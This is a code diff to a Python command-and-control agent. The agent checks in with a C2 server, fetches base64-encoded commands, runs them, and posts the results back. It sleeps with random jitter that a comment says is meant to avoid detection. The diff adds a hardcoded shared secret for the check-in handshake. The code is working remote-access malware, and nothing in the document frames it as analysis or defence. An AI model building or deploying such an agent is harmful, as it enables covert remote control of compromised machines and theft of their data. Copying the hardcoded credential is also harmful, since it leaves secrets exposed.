@@ -10,21 +10,19 @@ import os
 import platform
 import secrets
 import random
+from core.crypto import hash_challenge
 # from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-# Import from configuration
 from config.settings import (
     C2_SERVER, AGENT_SLEEP_MIN, AGENT_SLEEP_MAX, COMMAND_TIMEOUT, 
     LOG_LEVEL, LOG_FORMAT
 )
 
-# Configure logging
 logging.basicConfig(level=getattr(logging, LOG_LEVEL), format=LOG_FORMAT)
 
 # Disable insecure HTTPS warnings - in production, use valid certificates
 # requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
-# Create a session to maintain cookies
 session = requests.Session()
 
 def find_os():
@@ -59,7 +57,6 @@ def execute_command(cmd):
     }
 
     try:
-        # Decode the base64 command
         decoded_cmd = base64.urlsafe_b64decode(cmd).decode('utf-8').strip()
         if not decoded_cmd:
             data['error'] = 'No command received. Execution discontinued'
@@ -149,12 +146,19 @@ def check_in():
                 logging.error("Server didn't provide a challenge")
                 return False
                 
-            # Complete the challenge-response verification
-            # Calculate response (in a real scenario, this would use a shared secret)
+            ############# replace with secure KMS in future ###################
+            shared_secret = "uacneQWE1AKfjf"  
+            
+            # Calculate challenge response
+            challenge_response = hash_challenge(
+                challenge=server_nonce,
+                shared_secret=shared_secret
+            )
+            
             verify_data = {
                 'client_nonce': client_nonce,
                 'server_challenge': server_nonce,
-                # 'response': hash_function(client_nonce + server_nonce + shared_secret)
+                'response': challenge_response
             }
             
             verify_resp = session.post(
@@ -199,17 +203,14 @@ def get_commands():
                 if cmd:
                     logging.info("Command received")
                     
-                    # Execute the command
                     result = execute_command(cmd)
                     
-                    # Encode the results
                     result_payload = {
                         'output': base64.b64encode(str(result.get('output', '')).encode('utf-8')).decode('utf-8'),
                         'error': base64.b64encode(str(result.get('error', '')).encode('utf-8')).decode('utf-8'),
                         'code': result.get('code')
                     }
                     
-                    # Report results back to the server
                     report_resp = session.post(
                         f"{C2_SERVER}/report", 
                         json=result_payload, 
@@ -235,20 +236,16 @@ def run_agent():
     """
     logging.info("Starting C2 agent")
     
-    # Initial check-in
     if not check_in():
         logging.error("Initial check-in failed. Exiting.")
         return
     
     logging.info("Initial check-in successful. Starting command loop.")
     
-    # Main command loop
     while True:
         try:
-            # Get and execute commands
             get_commands()
             
-            # Sleep with jitter to avoid detection
             sleep_time = random.uniform(AGENT_SLEEP_MIN, AGENT_SLEEP_MAX)
             time.sleep(sleep_time)
             
@@ -257,7 +254,6 @@ def run_agent():
             break
         except Exception as e:
             logging.error(f"Error in main loop: {str(e)}")
-            # Sleep a bit before retrying
             time.sleep(5)
 
 if __name__ == "__main__":
